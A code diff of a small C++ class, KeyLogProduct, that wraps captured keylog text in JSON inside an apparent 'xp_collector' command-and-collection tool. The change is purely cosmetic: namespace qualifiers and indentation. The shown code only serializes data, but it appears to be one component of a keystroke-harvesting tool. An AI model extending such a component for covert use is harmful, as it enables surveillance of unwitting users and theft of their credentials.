@@ -1,15 +1,15 @@
 #include "KeyLogProduct.h"
 using namespace xp_collector;
 
-xp_collector::KeyLogProduct::KeyLogProduct(std::string product_id, std::string result)
-    : BasicProduct(std::move(product_id), CommandType::KeyLog)
-    , m_result(std::move(result))
+KeyLogProduct::KeyLogProduct(std::string product_id, std::string result)
+	: BasicProduct(std::move(product_id), CommandType::KeyLog)
+	  , m_result(std::move(result))
 {
 }
 
-json xp_collector::KeyLogProduct::serialize()
+json KeyLogProduct::serialize()
 {
-    json result = BasicProduct::serialize();
-    result[CONTENT_FIELD_NAME] = { {"keylog", m_result} };
-    return result;
+	json result = BasicProduct::serialize();
+	result[CONTENT_FIELD_NAME] = {{"keylog", m_result}};
+	return result;
 }
